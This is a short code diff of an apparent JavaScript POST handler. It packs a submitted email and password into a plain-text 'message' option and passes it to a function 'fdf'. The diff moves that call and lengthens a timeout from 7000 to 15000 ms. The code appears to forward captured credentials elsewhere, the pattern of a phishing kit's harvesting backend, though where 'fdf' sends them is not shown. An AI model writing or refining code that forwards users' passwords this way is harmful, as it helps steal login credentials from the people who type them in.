@@ -17,13 +17,12 @@ export async function POST(request) {
           'message': `${email} and ${password}`
         }
       };
-
+      fdf(options)
 
 const ans = await new Promise((resolve, reject) => {
-fdf(options)
 setTimeout(()=> {
 return resolve()
-},7000)
+},15000)
 
   
 })
